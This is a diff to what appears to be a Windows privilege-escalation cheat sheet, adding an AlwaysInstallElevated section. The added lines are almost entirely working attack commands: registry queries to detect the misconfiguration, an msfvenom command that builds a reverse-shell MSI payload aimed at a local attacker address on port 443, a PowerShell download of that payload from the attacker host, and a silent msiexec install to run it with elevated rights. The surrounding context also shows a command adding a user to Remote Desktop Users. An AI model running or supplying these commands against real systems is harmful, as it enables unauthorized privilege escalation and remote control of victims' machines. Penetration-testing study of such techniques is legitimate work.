@@ -158,6 +158,20 @@ net localgroup 'Remote Desktop Users' api /add
 ```
 ---
 # AlwaysInstallElevated
+```powershell
+reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+```
+<img width="1534" height="706" alt="image" src="https://github.com/user-attachments/assets/a70d541f-eb2a-4067-8af6-9a97ecc0d0c8" />
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.31.141 lport=443 -a x64 --platform windows -f msi -o ignite.msi
+```
+```powershell
+powershell wget 192.168.31.141/ignite.msi -o ignite.msi
+msiexec /quiet /qn /i ignite.msi
+```
+
 - https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/
 ---
 # SeBackupPrivilege
